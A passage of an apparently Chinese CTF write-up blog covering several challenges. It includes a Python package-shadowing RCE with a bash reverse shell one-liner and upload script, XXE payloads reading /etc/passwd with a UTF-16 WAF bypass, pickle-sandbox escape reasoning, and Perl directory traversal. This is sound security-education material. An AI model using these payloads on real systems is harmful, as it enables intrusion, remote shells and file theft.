class=\"title\">sanitize_filename</span>(<span class=\"params\">dangerous_filename</span>):</span></span><br><span class=\"line\">    print(len(dangerous_filename))</span><br><span class=\"line\">    res = re.match(<span class=\"string\">r&#x27;^[\\.a-zA-Z0-9_-]([\\.a-zA-Z0-9_-]+)*$&#x27;</span>, dangerous_filename)</span><br><span class=\"line\">    safe_filename = secrets.token_urlsafe(<span class=\"number\">32</span>)[:<span class=\"number\">32</span>] <span class=\"keyword\">if</span> res <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">else</span> dangerous_filename</span><br><span class=\"line\">    <span class=\"keyword\">return</span> safe_filename</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">render</span>(<span class=\"params\">filename</span>):</span></span><br><span class=\"line\">    src = config.UPLOAD_DIR / filename</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(src, <span class=\"string\">&#x27;r&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">    src.unlink()</span><br><span class=\"line\">    dst = config.UPLOAD_DIR / (filename + <span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(dst, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text2image.render(text, f)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@server.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>(<span class=\"params\">request</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        form = <span class=\"keyword\">await</span> request.form()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> form.get(<span class=\"string\">&#x27;file&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> DEFAULT_RESPONSE</span><br><span class=\"line\">        filename = sanitize_filename(form[<span class=\"string\">&#x27;file&#x27;</span>].filename[:config.MAX_FILENAME_LEN])</span><br><span class=\"line\">        data = form[<span class=\"string\">&#x27;file&#x27;</span>].file.read(config.MAX_TEXT_LEN)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> open(config.UPLOAD_DIR / filename, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            f.write(data)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> HTMLResponse(<span class=\"string\">f&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">Your file will soon be available in &lt;a href=&quot;static/<span class=\"subst\">&#123;filename&#125;</span>.png&quot;&gt;static/<span class=\"subst\">&#123;filename&#125;</span>.png&lt;/a&gt;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>, background=BackgroundTask(render, filename))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> DEFAULT_RESPONSE</span><br></pre></td></tr></table></figure> Starlette框架起的一个TXT转PNG的Web服务。我们上传文件，判断上传文件名非危险文件名后read()读取，删除原文件，调用text2image渲染，在static目录下生成随机文件名的PNG结果文件。文件名利用secrets.token_urlsafe来生成。由此可知，本题为Python 3.6以上环境。（secrets模块为Python 3.6引入的标准库）上传的目录为png目录（从config.py中来）。</p>\r\n<p>看起来没什么问题，再看看text2image是个什么东西，用<a href=\"https://github.com/drj11/pypng/blob/main/code/texttopng.py\">这个</a>改的，没啥意思。</p>\r\n<p>到此为止，没发现问题。下面我们可能要考虑一下Starlette框架的问题了，但在此之前，再看一下requirements.txt，发现有个pypng库。而text2image.py里也出现了<code>import png</code>，png对应着pypng库。但是我们上传与生成的文件都放在png目录下，这就有问题了。看一下<a href=\"https://docs.python.org/3/reference/import.html\">文档</a>，Python使用Packages的概念来进行功能管理。Python3起存在两种Package，一个叫Regular Package，一个叫Namespace Package。Regular Package就是一个包含有__init__.py的文件夹。Python在import的时候默认使用<a href=\"https://docs.python.org/3/glossary.html#term-import-path\">import path</a>查找Package，import path默认情况下跟随sys.path，而当前文件夹为sys.path的第一项内容。Python在import Package的时候会自动执行包的__init__.py。</p>\r\n<p>好了，很明显，如果我们提前写入一个__init__.py，就可以覆盖掉pypng的png Package，进而RCE。但是有个问题，本题是用Gunicorn起的，Gunicorn采用<a href=\"https://blog.csdn.net/jailman/article/details/78496522\">Pre-fork模型</a>，pypng包已经加载完成了。所以我们需要一种方式让Gunicorn重新启动main:server，加载我们恶意的png Package。</p>\r\n<p>注意到run.sh里Gunicorn调用时没有设置超时，默认情况下Gunicorn超时设置<a href=\"http://docs.gunicorn.org/en/stable/settings.html#timeout\">30秒</a>，如果我们可以让worker卡住30秒以上，那么Gunicorn就会重启worker，这时就会加载恶意的png Package。</p>\r\n<p>回到main.py，我们发现有两个点可能造成DOS，一个是sanitize_filename()那里用了个很长的正则表达式，可能造成ReDOS，还有一个是render()那里上传时文件过大就可能造成DOS。但是又用getsize()限制了大小，此路不通。</p>\r\n<p>我们看一下那个正则，<code>^[\\.a-zA-Z0-9_-]([\\.a-zA-Z0-9_-]+)*$</code>，匹配a-z A-Z 0-9 _ -这些符号，关键在后面的()分组里使用了*贪婪模式，尽可能的匹配字符，字符一旦多了就会处理缓慢，例如我们提交一个aaaaaaaaaaaaaaaaaaaa!，在regex101.com上匹配这个正则会报Catastrophic backtracking。</p>\r\n<p>我们现在有办法让worker停下来30秒了，还有一个问题没解决：我们没法上传png文件夹，只能上传单个文件。再回到main.py里，发现render()函数中读取文本内容用的是read()函数，没有其他参数，read()完成后会unlink()文件。如果我们让read()异常，就会直接跳出这个函数，unlink()就不能起作用了。题目中read()没加其他参数，那么默认编码是UTF-8，遇到编码错误就会报异常。我们上传一个非UTF-8编码的文件就可以了。</p>\r\n<p>本题所有难点全部解决，下面就是操作了：</p>\r\n<ol type=\"1\">\r\n<li><p>首先生成我们要执行的__init__.py。为方便起见，不分行写了，并且弹一个shell出来。<code>__import__('os').system('bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1 ')</code>。</p></li>\r\n<li><p>然后需要将其转成非UTF-8编码的文件，我们选个GB2312吧（读写中文文本时应该都没少被它折磨过）。但是有个问题，Python3脚本默认使用UTF-8编码，如果我们改变文件编码，需要在py文件头加一句<code># coding=GB2312</code>声明一下，并且插入确实与UTF-8字符编码不相同的字符，例如中文。因此__init__.py实际内容为： <figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># coding&#x3D;GB2312</span><br><span class=\"line\">#测试</span><br><span class=\"line\">__import__(&#39;os&#39;).system(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888 0&gt;&amp;1 &#39;)</span><br></pre></td></tr></table></figure></p></li>\r\n<li><p>用iconv转码<code>iconv -f utf-8 -t gb2312 &lt; payload.py &gt; __init__.py</code></p></li>\r\n<li><p>写个脚本上传： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">s=requests.session()</span><br><span class=\"line\">s.post(<span class=\"string\">&#x27;http://127.0.0.1:8080/&#x27;</span>,files=&#123;<span class=\"string\">&#x27;file&#x27;</span>:(<span class=\"string\">&#x27;__init__.py&#x27;</span>,open(<span class=\"string\">&#x27;__init__.py&#x27;</span>,<span class=\"string\">&#x27;rb&#x27;</span>).read())&#125;)</span><br><span class=\"line\">s.post(<span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>,files=&#123;<span class=\"string\">&#x27;file&#x27;</span>:(<span class=\"string\">&#x27;a*31&#x27;</span>+<span class=\"string\">&#x27;!&#x27;</span>,<span class=\"string\">b&#x27;&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure></p></li>\r\n<li><p>收shell。</p></li>\r\n</ol>\r\n\n    <div id=\"aplayer-yjTRPzAX\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"5259436\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{b65583ad-a2ba-4473-91fa-0b1d38f6889f}</p>\r\n","categories":["Writeups"]},{"title":"CSAW Quals 2019 Unagi","url":"/2019/09/17/CSAW-Quals-2019-Unagi/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>CSAWCTF Quals 2019的Unagi，XXE题目。 打开后允许我们上传XML文件，并且给出了示例XML。 <a id=\"more\"></a> <figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">users</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span>alice<span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>passwd1<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>Alice<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">email</span>&gt;</span>alice@fakesite.com<span class=\"tag\">&lt;/<span class=\"name\">email</span>&gt;</span>  </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">group</span>&gt;</span>CSAW2019<span class=\"tag\">&lt;/<span class=\"name\">group</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span>bob<span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>passwd2<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span> Bob<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">email</span>&gt;</span>bob@fakesite.com<span class=\"tag\">&lt;/<span class=\"name\">email</span>&gt;</span>  </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">group</span>&gt;</span>CSAW2019<span class=\"tag\">&lt;/<span class=\"name\">group</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">users</span>&gt;</span></span><br></pre></td></tr></table></figure> 很明显的在考XXE，我们直接套用<a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection\">Payload</a>就行。</p>\r\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">root</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">test</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">users</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span>alice<span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>passwd1<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>Alice<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">email</span>&gt;</span>alice@fakesite.com<span class=\"tag\">&lt;/<span class=\"name\">email</span>&gt;</span>  </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">group</span>&gt;</span>CSAW2019<span class=\"tag\">&lt;/<span class=\"name\">group</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span>bob<span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>passwd2<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span> Bob<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">email</span>&gt;</span>bob@fakesite.com<span class=\"tag\">&lt;/<span class=\"name\">email</span>&gt;</span>  </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">group</span>&gt;</span><span class=\"symbol\">&amp;test;</span><span class=\"tag\">&lt;/<span class=\"name\">group</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">users</span>&gt;</span></span><br></pre></td></tr></table></figure>\r\n<p>然后我们发现，放在user或者group标签下最多显示15位字符，然后我们看一下User页面，发现其实还存在一个Intro标签。我们改一下Payload: <figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">root</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">test</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">users</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span>alice<span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>passwd1<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>Alice<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">email</span>&gt;</span>alice@fakesite.com<span class=\"tag\">&lt;/<span class=\"name\">email</span>&gt;</span>  </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">group</span>&gt;</span>CSAW2019<span class=\"tag\">&lt;/<span class=\"name\">group</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span>bob<span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>passwd2<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span> Bob<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">email</span>&gt;</span>bob@fakesite.com<span class=\"tag\">&lt;/<span class=\"name\">email</span>&gt;</span>  </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">group</span>&gt;</span><span class=\"symbol\">&amp;test;</span><span class=\"tag\">&lt;/<span class=\"name\">group</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">intro</span>&gt;</span><span class=\"symbol\">&amp;test;</span><span class=\"tag\">&lt;/<span class=\"name\">intro</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">users</span>&gt;</span></span><br></pre></td></tr></table></figure> 提交给upload.php发现有WAF，不允许出现file关键词。参考<a href=\"https://mohemiv.com/tags/xxe/\">这个</a>，我们上传XML的时候可以采用UTF-8和UTF-16两种编码格式。默认的WAF不会处理UTF-16的字符。那么我们试一下更改文件编码。用iconv工具即可。<code>cat sample.xml|iconv -f UTF-8 -t UTF-16BE &gt; payload.xml</code>然后提交，发现确实读到/etc/passwd文件了。然后我们来读一下/flag，发现返回空。file://协议不行，我们试一下php://filter，把<code>file:///flag</code>改为<code>php://filter/convert.base64-encode/resource=/../../../flag</code>，得到Base64编码的Flag，处理一下就可以了。</p>\r\n\n    <div id=\"aplayer-bHkGQDCa\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"5266644\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{9d04beb3-6aff-47f3-aac1-2709d91ac364}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","XXE"]},{"title":"Balsn CTF 2019 Pyshv1","url":"/2019/10/11/Balsn-CTF-2019-Pyshv1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>Balsn CTF 2019的Pyshv1和2。Python沙盒的题。</p>\r\n<h1 id=\"pyshv1\">Pyshv1</h1>\r\n<a id=\"more\"></a>\r\n<p>先看v1。给了源码，并且已知运行环境为Python 3.6：</p>\r\n<figure class=\"highlight python\"><figcaption><span>securePickle.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle, io</span><br><span class=\"line\"></span><br><span class=\"line\">whitelist = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RestrictedUnpickler</span>(<span class=\"params\">pickle.Unpickler</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">find_class</span>(<span class=\"params\">self, module, name</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> module <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> whitelist <span class=\"keyword\">or</span> <span class=\"string\">&#x27;.&#x27;</span> <span class=\"keyword\">in</span> name:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> KeyError(<span class=\"string\">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">loads</span>(<span class=\"params\">s</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class=\"line\"></span><br><span class=\"line\">dumps = pickle.dumps </span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight python\"><figcaption><span>server.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> securePickle <span class=\"keyword\">as</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> codecs</span><br><span class=\"line\"></span><br><span class=\"line\">pickle.whitelist.append(<span class=\"string\">&#x27;sys&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pysh</span>(<span class=\"params\">object</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        self.login()</span><br><span class=\"line\">        self.cmds = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        user = input().encode(<span class=\"string\">&#x27;ascii&#x27;</span>)</span><br><span class=\"line\">        user = codecs.decode(user, <span class=\"string\">&#x27;base64&#x27;</span>)</span><br><span class=\"line\">        user = pickle.loads(user)</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> NotImplementedError(<span class=\"string\">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            req = input(<span class=\"string\">&#x27;$ &#x27;</span>)</span><br><span class=\"line\">            func = self.cmds.get(req, <span class=\"literal\">None</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> func <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                print(<span class=\"string\">&#x27;pysh: &#x27;</span> + req + <span class=\"string\">&#x27;: command not found&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                func()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    pysh = Pysh()</span><br><span class=\"line\">    pysh.run()</span><br></pre></td></tr></table></figure>\r\n<p>这里用到了pickle，先来了解一下pickle是什么，官方文档在<a href=\"https://docs.python.org/3/library/pickle.html\">这里</a>。简单来说，pickle模块是Python用于序列化与反序列化用的，源码在<a href=\"https://github.com/python/cpython/blob/3.6/Lib/pickle.py\">这里</a>。pickle实际上是一种栈结构的语言，存在指令结构。相比PHP，它更加智能化，能够进行一些运算操作。</p>\r\n<p>find_class()函数在pickle模块中实现，代码如下： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">find_class</span>(<span class=\"params\">self, module, name</span>):</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Subclasses may override this.</span></span><br><span class=\"line\">​        <span class=\"keyword\">if</span> self.proto &lt; <span class=\"number\">3</span> <span class=\"keyword\">and</span> self.fix_imports:</span><br><span class=\"line\">​            <span class=\"keyword\">if</span> (module, name) <span class=\"keyword\">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class=\"line\">​                module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class=\"line\">​            <span class=\"keyword\">elif</span> module <span class=\"keyword\">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class=\"line\">​                module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class=\"line\">​        __import__(module, level=<span class=\"number\">0</span>)</span><br><span class=\"line\">​        <span class=\"keyword\">if</span> self.proto &gt;= <span class=\"number\">4</span>:</span><br><span class=\"line\">​            <span class=\"keyword\">return</span> _getattribute(sys.modules[module], name)[<span class=\"number\">0</span>]</span><br><span class=\"line\">​        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">​            <span class=\"keyword\">return</span> getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure> 注意到它会getattr()返回sys.modules的内容，sys.modules是个dict。题目所给的源码重写了find_class()函数，限制了只允许出现sys模块的内容。如果我们为sys.modules添加{'os',module('os')}，那么os模块就可以被全局使用了。</p>\r\n<p>有一个基本问题是，Python中模块是什么？具体区别参考<a href=\"https://stackoverflow.com/questions/43183244/difference-between-module-and-class-in-python\">这里</a>，就本题而言，可以单纯认为模块是一个叫做module的类的子类。所以，我们通过pickle反序列化sys，实际上是一个module类，这样是可行的。而所有的class都是object的子类。</p>\r\n<p>下一问题是，我们仍然需要找到任意执行代码的手段。我们反序列化后，如果没有函数来执行就没有任何效果。PHP上我们找魔术方法，同样的Python也有，pickle在处理__reduce__方法时可能造成RCE，具体请参考<a href=\"https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler\">这里</a>和<a href=\"https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html\">这里</a>。我们同样需要__reduce__方法来触发，否则我们没有办法执行os.system()函数。</p>\r\n<p>本题目前有两种做法：一是通过pickle语言直接写指令，二是构造一个module类，利用pickle类生成指令。我们选择构造一个类（pickle写不明白）。</p>\r\n<h2 id=\"构造class-module\">构造class module</h2>\r\n<p>先来个基本框架：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle,sys</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Fake</span>(<span class=\"params\">type(<span class=\"params\">sys</span>)</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\r\n<p>Python中禁止直接创建module类，我们用type()间接得到。在pickle模块源码中find_class()使用到了getattr，</p>\r\n\n    <div id=\"aplayer-ewgCFbvP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"4351614\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{f8b94b7e-e67f-49a7-92dd-37f3ab5ad7ef}</p>\r\n","categories":["Writeups"],"tags":["Misc","Python","Pickle"]},{"title":"CSAW2016 Web I Got ID","url":"/2019/10/06/CSAW2016-Web-I-Got-ID/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>CSAW 2016 Qualification CTF的I Got ID。Perl的题。 打开页面，有三个链接，.pl结尾，可能是Perl脚本，CGI？点开以后hello.pl只有依据提示，没有作用。而forms.pl允许我们输入Name与Age。然后就原样输出了。重点是file.pl，允许我们上传文件，然后他会再读取，显示到当前页面。 然后如果我们用Acunetix，其实就能扫出来漏洞了。扫描报告如下： <a id=\"more\"></a> <div class=\"pdfobject-container\" data-target=\"Report.pdf\" data-height=\"500px\"></div></p>\r\n<p>其中有一条Directory traversal，根据所给的Payload我们可以得到/etc/passwd的内容。然后盲猜flag在根目录，我们直接读/flag就能得到flag的内容。</p>\r\n<p>那么，问题来了，为什么这样就能得到flag呢？我们注意到POST的数据包中又传递了奇怪的file，内容为ARGV。具体原因我们还是翻源码吧。</p>\r\n<p>根据刚才的Payload我们来尝试读一下源码，/var/www/html没有反应，我们读一下/etc/apache2/httpd.conf，这个是Alpine Linux的Apache2默认配置文件路径，从中我们得到cgi-bin在/var/www/localhost/下，然后我们读file.pl，得到下面内容：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">#!/usr/bin/perl</span></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">strict</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">warnings</span>;    </span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">CGI</span>;</span><br><span class=\"line\">my $cgi = CGI-&gt;new;</span><br><span class=\"line\"><span class=\"keyword\">print</span> $cgi-&gt;header;</span><br><span class=\"line\"><span class=\"keyword\">print</span> &lt;&lt; <span class=\"string\">&quot;EndOfHTML&quot;</span>;</span><br><span class=\"line\">&lt;!DOCTYPE html <span class=\"keyword\">PUBLIC</span> <span 